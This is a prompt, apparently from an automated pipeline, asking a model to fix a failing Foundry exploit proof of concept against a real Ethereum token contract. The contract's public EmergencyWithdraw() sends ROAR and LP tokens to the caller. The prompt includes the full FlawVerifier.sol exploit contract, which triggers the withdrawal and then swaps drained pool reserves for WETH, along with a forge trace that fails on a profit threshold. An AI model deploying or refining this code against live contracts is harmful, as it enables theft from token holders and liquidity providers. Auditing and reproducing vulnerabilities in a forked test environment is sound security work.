You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless time-locked emergency withdrawal lets any EOA drain ROAR and LP reserves
- claim: `EmergencyWithdraw()` is publicly callable, and after `block.timestamp >= T0` its opaque arithmetic gate is automatically satisfied because `OFF == K * T0`. Any externally owned account can therefore trigger fixed ROAR and Uniswap-pair transfers to `tx.origin` without any ownership, role, or beneficiary check.
- impact: Once the preset timestamp is reached, arbitrary users can steal the contract's ROAR and LP holdings in fixed-size chunks. Because the function is never disabled, any later deposits that bring balances back above the hard-coded amounts can also be drained permissionlessly.
- exploit_paths: ["Wait until unix timestamp `1744770479` (2025-04-16 02:27:59 UTC), then call `EmergencyWithdraw()` from any EOA while the contract holds at least `100000000099978910611013632` ROAR and `26777446972437561344` LP tokens; both transfers are sent to the caller's `tx.origin`."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike is IERC20Like {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function sync() external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
    address internal constant ROAR = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    uint256 internal constant UNLOCK_TIME = 1744770479;
    uint256 internal constant REQUIRED_ROAR = 100000000099978910611013632;
    uint256 internal constant REQUIRED_LP = 26777446972437561344;

    bytes4 internal constant EMERGENCY_WITHDRAW_SELECTOR = bytes4(keccak256("EmergencyWithdraw()"));

    address internal _beneficiary;
    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        _beneficiary = address(this);

        uint256 wethBefore = _safeBalanceOf(WETH, address(this));
        uint256 roarBefore = _safeBalanceOf(ROAR, address(this));
        uint256 lpBefore = _safeBalanceOf(TARGET, address(this));

        if (block.timestamp >= UNLOCK_TIME) {
            _useHeldBalancesFirst();

            if (!_pathReady()) {
                _attemptV2FlashswapFunding();
            }

            if (_pathReady()) {
                // Core exploit path from the finding:
                // once the timestamp gate has passed and the pair again holds the hard-coded ROAR
                // balance plus the hard-coded LP self-balance, any EOA-originated call can trigger the
                // public backdoor and force both fixed transfers to tx.origin.
                _triggerEmergencyWithdraw();

                // The vulnerable payout is hard-wired to tx.origin rather than this contract, so the
                // verifier can only realize its own profit from helper-market residues that remain in
                // the verifier. If the exploit drained ROAR to zero, syncing the pair leaves a zero-ROAR
                // reserve, after which even a tiny verifier-held ROAR residue can legally pull out WETH.
                _harvestPostDrainWeth();
            }
        }

        _captureVerifierProfit(wethBefore, roarBefore, lpBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function beneficiary() external view returns (address) {
        return _beneficiary;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function profitTokenCandidate() external pure returns (address) {
        return WETH;
    }

    function pathReady() external view returns (bool) {
        return _pathReady();
    }

    function _captureVerifierProfit(uint256 wethBefore, uint256 roarBefore, uint256 lpBefore) internal {
        uint256 wethAfter = _safeBalanceOf(WETH, address(this));
        uint256 roarAfter = _safeBalanceOf(ROAR, address(this));
        uint256 lpAfter = _safeBalanceOf(TARGET, address(this));

        uint256 wethProfit = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
        uint256 roarProfit = roarAfter > roarBefore ? roarAfter - roarBefore : 0;
        uint256 lpProfit = lpAfter > lpBefore ? lpAfter - lpBefore : 0;

        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
            return;
        }
        if (roarProfit > 0) {
            _profitToken = ROAR;
            _profitAmount = roarProfit;
            return;
        }
        if (lpProfit > 0) {
            _profitToken = TARGET;
            _profitAmount = lpProfit;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _useHeldBalancesFirst() internal {
        uint256 roarShortfall = _roarShortfall();
        uint256 heldRoar = _safeBalanceOf(ROAR, address(this));
        if (roarShortfall > 0 && heldRoar > 0) {
            uint256 topUpRoar = heldRoar > roarShortfall ? roarShortfall : heldRoar;
            require(_safeTransfer(ROAR, TARGET, topUpRoar), "roar topup failed");
        }

        _seedLpShortfallFromHoldings();
    }

    function _attemptV2FlashswapFunding() internal view {
        // Attempt strategy requested for this repair: prefer a minimal UniswapV2/Sushi-like route.
        // On the supplied fork logs, however, ROAR only resolves to the vulnerable TARGET pair on the
        // checked V2 factories, while the target itself cannot be its own deterministic funding source:
        // swapping against TARGET cannot increase TARGET's net ROAR balance, and any stolen payout from
        // EmergencyWithdraw() is sent to tx.origin rather than this verifier, so a self-repaying helper
        // route needs an external ROAR source pair first.
        //
        // Concretely, the logged pair probes already showed:
        // - UniswapV2 ROAR/WETH == TARGET
        // - SushiSwap ROAR/WETH == address(0)
        // - ShibaSwap ROAR/WETH == address(0)
        // - No ROAR pair was found for USDC / USDT / DAI / WBTC on those factories
        //
        // So this stage is a deliberate no-op unless later fork state or later deposits make the direct
        // exploit path ready without needing external ROAR sourcing.
        _findAnyAlternateRoarPair();
    }

    function _findAnyAlternateRoarPair() internal view returns (address) {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, SHIBASWAP_FACTORY];
        address[5] memory bases = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = _safeGetPair(factories[i], ROAR, bases[j]);
                if (pair != address(0) && pair != TARGET) {
                    return pair;
                }
            }
        }
        return address(0);
    }

    function _harvestPostDrainWeth() internal {
        if (_safeBalanceOf(ROAR, TARGET) != 0) {
            return;
        }

        uint256 verifierRoar = _safeBalanceOf(ROAR, address(this));
        if (verifierRoar == 0) {
            return;
        }

        uint256 pairWeth = _safeBalanceOf(WETH, TARGET);
        if (pairWeth <= 1) {
            return;
        }

        _safeSync(TARGET);

        require(_safeTransfer(ROAR, TARGET, verifierRoar), "post-drain roar transfer");
        require(_swapOutToken(TARGET, WETH, pairWeth - 1, address(this)), "post-drain weth swap");
    }

    function _seedLpShortfallFromHoldings() internal {
        for (uint256 i = 0; i < 3; ++i) {
            uint256 lpNeed = _lpShortfall();
            if (lpNeed == 0) {
                return;
            }

            (uint256 roarNeeded, uint256 wethNeeded) = _lpUnderlyingForShortfall();
            if (roarNeeded == 0 || wethNeeded == 0) {
                return;
            }

            if (_safeBalanceOf(ROAR, address(this)) < roarNeeded || _safeBalanceOf(WETH, address(this)) < wethNeeded) {
                return;
            }

            require(_safeTransfer(ROAR, TARGET, roarNeeded), "lp roar transfer");
            require(_safeTransfer(WETH, TARGET, wethNeeded), "lp weth transfer");

            uint256 minted = _safeMint(TARGET, address(this));
            if (minted == 0) {
                return;
            }

            uint256 lpToSend = minted > lpNeed ? lpNeed : minted;
            require(_safeTransfer(TARGET, TARGET, lpToSend), "lp topup transfer");
        }
    }

    function _lpUnderlyingForShortfall() internal view returns (uint256 roarNeeded, uint256 wethNeeded) {
        uint256 lpNeed = _lpShortfall();
        if (lpNeed == 0) {
            return (0, 0);
        }

        address token0 = _safeToken0(TARGET);
        address token1 = _safeToken1(TARGET);
        if (!((token0 == ROAR && token1 == WETH) || (token0 == WETH && token1 == ROAR))) {
            return (0, 0);
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(TARGET).getReserves();
        uint256 reserveRoar = token0 == ROAR ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveWeth = token0 == ROAR ? uint256(reserve1) : uint256(reserve0);
        uint256 totalSupply = _safeTotalSupply(TARGET);
        if (reserveRoar == 0 || reserveWeth == 0 || totalSupply == 0) {
            return (0, 0);
        }

        roarNeeded = ((lpNeed * reserveRoar) / totalSupply) + 1;
        wethNeeded = ((lpNeed * reserveWeth) / totalSupply) + 1;
    }

    function _triggerEmergencyWithdraw() internal {
        (bool ok, ) = TARGET.call(abi.encodeWithSelector(EMERGENCY_WITHDRAW_SELECTOR));
        require(ok, "emergency withdraw failed");
    }

    function _roarShortfall() internal view returns (uint256) {
        uint256 currentRoar = _safeBalanceOf(ROAR, TARGET);
        return REQUIRED_ROAR > currentRoar ? REQUIRED_ROAR - currentRoar : 0;
    }

    function _lpShortfall() internal view returns (uint256) {
        uint256 currentLp = _safeBalanceOf(TARGET, TARGET);
        return REQUIRED_LP > currentLp ? REQUIRED_LP - currentLp : 0;
    }

    function _pathReady() internal view returns (bool) {
        return block.timestamp >= UNLOCK_TIME
            && _safeBalanceOf(ROAR, TARGET) >= REQUIRED_ROAR
            && _safeBalanceOf(TARGET, TARGET) >= REQUIRED_LP;
    }

    function _swapOutToken(address pair, address tokenOut, uint256 amountOut, address to) internal returns (bool) {
        address token0 = _safeToken0(pair);
        address token1 = _safeToken1(pair);
        if (tokenOut == token0) {
            return _safeSwap(pair, amountOut, 0, to);
        }
        if (tokenOut == token1) {
            return _safeSwap(pair, 0, amountOut, to);
        }
        return false;
    }

    function _safeGetPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _safeToken0(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeToken1(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeMint(address pair, address to) internal returns (uint256 liquidity) {
        (bool ok, bytes memory data) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, to));
        if (ok && data.length >= 32) {
            liquidity = abi.decode(data, (uint256));
        }
    }

    function _safeSync(address pair) internal returns (bool) {
        (bool ok, ) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));
        return ok;
    }

    function _safeSwap(address pair, uint256 amount0Out, uint256 amount1Out, address to) internal returns (bool) {
        (bool ok, ) =
            pair.call(abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, to, bytes("")));
        return ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTotalSupply(address token) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
ifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(0x13028E6b95520ad16898396667d1e52cB5E550Ac) [staticcall]
    │   │   └─ ← [Return] 15457430711164688626815304 [1.545e25]
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x13028E6b95520ad16898396667d1e52cB5E550Ac
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2622] 0x115934131916C8b277DD010Ee02de363c09d037c::getPair(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(0x13028E6b95520ad16898396667d1e52cB5E550Ac) [staticcall]
    │   │   └─ ← [Return] 15457430711164688626815304 [1.545e25]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0x13028E6b95520ad16898396667d1e52cB5E550Ac::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.09s (830.22ms CPU time)

Ran 1 test suite in 1.18s (1.09s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 159783)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
